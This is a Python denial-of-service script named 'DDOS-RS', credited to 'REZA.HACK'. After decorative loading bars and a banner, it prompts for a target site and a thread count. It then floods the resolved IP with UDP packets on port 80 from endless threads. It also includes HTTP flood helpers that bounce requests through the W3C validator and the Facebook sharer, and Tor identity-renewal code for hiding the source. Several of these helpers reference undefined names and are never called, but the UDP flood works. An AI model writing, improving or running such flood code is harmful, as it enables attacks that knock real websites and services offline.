#python DDOS-RS Script v.1

from os import system
from time import sleep
import time
import os
import socket
import random
import threading
import logging
import sys
import urllib
import _thread
class colorma:


    CYAN = '\033[96m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDER = '\033[4m'
    #--- ITS END ---
    END = '\033[0m'

print("")
print("")
print("           please wait....")
time.sleep(0.5)
os.system("pip install socket")
os.system("apt install screenfetch -y")
os.system("clear")
os.system("screenfetch")
time.sleep(2)
os.system("clear")

try: system("clear")
except: system ("class")
s = "\033[91m\033"
print (s+" 0% [=                              ]")
sleep (0.3)
try: system("clear")
except: system ("class")
print ("15% [===                         ]")
sleep (0.3)
try: system ("clear")
except: system("class")
print ("20% [=======                      ]")
sleep (0.3)
try: system("clear")
except: system("class")
print ("30% [=========                 ]")
sleep (0.3)
try: system("clear")
except: system("class")
print ("45% [==============          ]")
sleep (0.3)
try: system("clear")
except: system("class")
print ("65% [=======================          ]")
sleep (0.3)
try: system ("clear")
except: system("class")
print ("85% [=============================       ]")
sleep (0.3)
try: system("clear")
except: system("class")
print ("100% [========================================================]")
sleep (1)

print(f"{colorma.RED}")
print(f"\n[#10٪]{colorma.RED}")
time.sleep(0.1)
print(f"\n[##15٪]{colorma.RED}")
time.sleep(0.1)
print("\n[###20٪]")
time.sleep(0.1)
print("\n[####25٪]")
time.sleep(0.1)
print("\n[#####30٪]")
time.sleep(0.1)
print("\n[######35٪]")
time.sleep(0.1)
print("\n[#######40٪]")
time.sleep(0.1)
print("\n[########45٪]")
time.sleep(0.1)
print("\n[#########50٪]")
time.sleep(0.1)
print("\n[##########55٪]")
time.sleep(0.1)
print("\n[###########60٪]")
time.sleep(0.1)
print("\n[############65٪]")
time.sleep(0.1)
print("\n[#############70٪]")
time.sleep(0.1)
print("\n[##############75٪]")
time.sleep(0.1)
print("\n[###############80٪]")
time.sleep(0.1)
print("\n[################85٪]")
time.sleep(0.1)
print("\n[#################90٪]")
time.sleep(0.1)
print("\n[##################95٪]")
time.sleep(0.1)
print("\n[###################100٪]")
time.sleep(0.1)
os.system("clear")
print(f" \n                           ~.....D.....~{colorma.GREEN}")
time.sleep(0.1)
print(f" \n                           ~.....D.....~{colorma.RED}")
time.sleep(0.1)
print(f" \n                           ~.....O.....~{colorma.GREEN}")
time.sleep(0.1)
print(f" \n                           ~.....S.....~{colorma.RED}")
time.sleep(0.1)
print(f" \n                           ~.....R.....~{colorma.GREEN}")
time.sleep(0.1)
print(f" \n                           ~.....S.....~{colorma.RED}")
time.sleep(0.1)
os.system("clear")

print("""
       ██████╗ ██████╗  ██████╗ ███████╗    ██████╗ ███████╗
       ██╔══██╗██╔══██╗██╔═══██╗██╔════╝    ██╔══██╗██╔════╝
       ██║  ██║██║  ██║██║   ██║███████╗    ██████╔╝███████╗
       ██║  ██║██║  ██║██║   ██║╚════██║    ██╔══██╗╚════██║
       ██████╔╝██████╔╝╚██████╔╝███████║    ██║  ██║███████║
       ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝    ╚═╝  ╚═╝╚══════╝
""")

print(f""" \n {colorma.CYAN}
                  ____________________________
                 |          DDos.RS           |
                 |----------------------------|
                 |Author of tools : REZA.HACK |
                 |Team name : BAX_CYBERY{colorma.CYAN}      |
                 |                            |
                 |____________________________|  """)
print("_________________________________________________________________")

site = input(f"\nEnter your site url :-»")
thread_count = input(f"Enter your thread :-» ")
ip = socket.gethostbyname(site)
UDP_PORT = 80
MESSAGE = 'virus32'
print("UDP target IP:»", ip)
print("UDP target port:»", UDP_PORT)

time.sleep(3)

def DDOSRS(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
			time.sleep(.1)
	except:
		time.sleep(.1)

def DDOSRS_bots():
	global bots
	bots=[]
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	return(bots)

def bot_DDOSRS(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
			print("")
			time.sleep(.1)
	except:
		time.sleep(.1)
		
def renewTorIdentity(self, passAuth):
	try:
		resp = os.system("sudo /etc/init.d/tor restart")
		socks.set_default_proxy(socks.SOCKS4, "127.0.0.1", 9050)
		socket.socket = socks.socksocket
		s = socket.socket()
		s.connect(('localhost', 9051))
		s.send('AUTHENTICATE "{0}"\r\n'.format(passAuth))
		resp = s.recv(1024)
		if resp.startswith('250'):
			s.send("signal NEWNYM\r\n")
			resp = s.recv(1024)
			if resp.startswith('250'):
				print ("Identity renewed")
			else:
				print ("response 2:", resp)
		else:
			print ("response 1:", resp)
	except Exception as e:
		print ("Can't renew identity: ", e)

def checkForTor():
	try:
		resp = os.system("ps aux | grep -w [t]or")
		if resp == 0:
			print ("Tor instalado")
			return 0
		else:
			print ("Tor No instalado")
			return 1
	except Exception as e:
		print ("Excepcion de Tor: ", e)

def installTor():
	resp = os.system("sudo apt-get install tor")

def ddos(i):

    while 1:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
        print ("\033[94m",time.ctime(time.time()),"\033[0m \033[92m________packet____Sent______DDOS-RS_________\033[91m")
        print ("\033[94m",time.ctime(time.time()),"\033[0m \033[91m________packet____Sent______DDOS-RS_________\033[91m")
        print ("\033[94m",time.ctime(time.time()),"\033[0m \033[92m________packet____Sent______DDOS-RS_________\033[91")
        
def dos():
	while True:
		item = q.get()
		down_it(item)
		q.task_done()

def dos2():
	while True:
		item=w.get()
		bot_DDOSRS(random.choice(bots)+"http://"+host)
		w.task_done()

for i in range(int(thread_count)):
    try:
        _thread.start_new_thread(ddos, ("Thread-" + str(i),))
    except KeyboardInterrupt:
        print("\033[91mno connection! server maybe down\033[0m")
		#print("\033[91m",e,"\033[0m")
		
        sys.exit(0)
while 1:
    pass
